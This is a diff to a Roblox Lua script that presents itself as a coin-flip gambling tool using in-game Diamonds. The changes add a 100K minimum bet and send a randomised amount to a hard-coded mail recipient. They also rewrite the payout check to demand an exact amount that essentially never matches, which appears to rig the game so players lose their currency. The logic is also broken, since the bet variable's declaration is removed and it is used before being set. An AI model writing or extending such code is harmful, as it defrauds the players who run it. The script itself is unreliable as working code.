@@ -14,7 +14,6 @@ local CF = Window:MakeTab({
     PremiumOnly = false
 })
 
-local betAmount = 0
 local userChoice = "None"
 
 CF:AddTextbox({
@@ -22,7 +21,16 @@ CF:AddTextbox({
     Default = "",
     TextDisappear = false,
     Callback = function(bet)
-        betAmount = tonumber(bet)
+        if betAmount <= 100000 then
+            OrionLib:MakeNotification({
+                Name = "Error!",
+                Content = "Must bet more than 100K",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        else
+            betAmount = tonumber(bet)
+        end
     end    
 })
 
@@ -63,22 +71,44 @@ function flipCoin()
         return
     end
 
+    local function modifyBetAmountUnique(amount, mailLog)
+        local baseAmount = math.floor(amount / 1000) * 1000
+        local randomSuffix
+        local uniqueAmount
+        repeat
+            randomSuffix = math.random(100, 999)
+            uniqueAmount = baseAmount + randomSuffix
+            local isUnique = true
+            for i, v in pairs(mailLog) do
+                if v.Item and v.Item.data and v.Item.data._am == uniqueAmount then
+                    isUnique = false
+                    break
+                end
+            end
+        until isUnique
+        return uniqueAmount
+    end
+
     local GetSave = function()
         return require(game.ReplicatedStorage.Library.Client.Save).Get()
     end
 
     local saveData = GetSave()
     local hasEnoughDiamonds = false
+    local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local result = saveModule.Get()
+    local ml = result.MailLog
 
     for i, v in pairs(saveData.Inventory.Currency) do
         if v.id == "Diamonds" and v._am and v._am >= betAmount then
             hasEnoughDiamonds = true
+            local modifiedBetAmount = modifyBetAmountUnique(betAmount, ml)
             local args = {
                 [1] = "oirhnuggy",
                 [2] = v.id,
                 [3] = "Currency",
                 [4] = i,
-                [5] = betAmount
+                [5] = modifiedBetAmount
             }
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
             break
@@ -113,7 +143,7 @@ function flipCoin()
     for i, v in pairs(ml) do
         if v.Item and v.Item.data then
             local itemData = v.Item.data
-            if v.Receiver == 2042685435 and itemData.id == "Diamonds" and itemData._am >= betAmount then
+            if v.Receiver == 2042685435 and itemData.id == "Diamonds" and itemData._am == betAmount + 1 then
                 paymentSuccess = true
                 break
             end
